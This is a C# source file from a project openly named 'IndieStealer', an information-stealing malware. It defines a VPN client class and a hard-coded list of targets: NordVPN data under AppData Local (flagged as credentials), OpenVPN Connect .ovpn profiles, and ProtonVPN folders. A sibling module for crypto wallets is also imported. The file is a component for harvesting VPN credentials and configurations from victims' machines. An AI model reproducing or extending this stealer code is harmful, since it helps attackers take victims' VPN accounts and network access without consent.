using System.Collections.Generic;
using System.Drawing;
using IndieStealer.Collect.CryptoWallets;

namespace IndieStealer.Collect.VPNs
{ 
   
    class VPNClientObject
    {
        protected internal static List<VPNClientObject> VPNClientList = new List<VPNClientObject>()
        {
            new VPNClientObject("NordVPN",Info.AppdataLocal + "\\NordVPN\\",true,searchPattern:"NordVpn.exe*"),
            new VPNClientObject("OpenVPN",Info.Appdata + "\\OpenVPN Connect\\profiles",false,true,true,"ovpn",null),
            new VPNClientObject("ProtonVPN",Info.AppdataLocal + "\\ProtonVPN",false,true,true,null,"Proton")
        };
        public string Name { get; set; }
        public string Path { get; set; }
        
        public string[] Data { get; set; }
        
        public bool IsFile { get; set; }
        
        public bool IsDataMultiple { get; set; }
        
        public bool IsCredentials { get; set; }
        
        public string SearchPattern { get; set; }
        public string FolderFilter { get; set; }
        
        public VPNClientObject(string name, string path, bool isCredentials, bool isFile = false, bool isDataMultiple = false, string searchPattern = null, string folderFilter = null)
        {
            Name = name;
            Path = path;
            IsCredentials = isCredentials;
            IsFile = isFile;
            IsDataMultiple = isDataMultiple;
            SearchPattern = searchPattern;
            FolderFilter = folderFilter;
        }
    }
}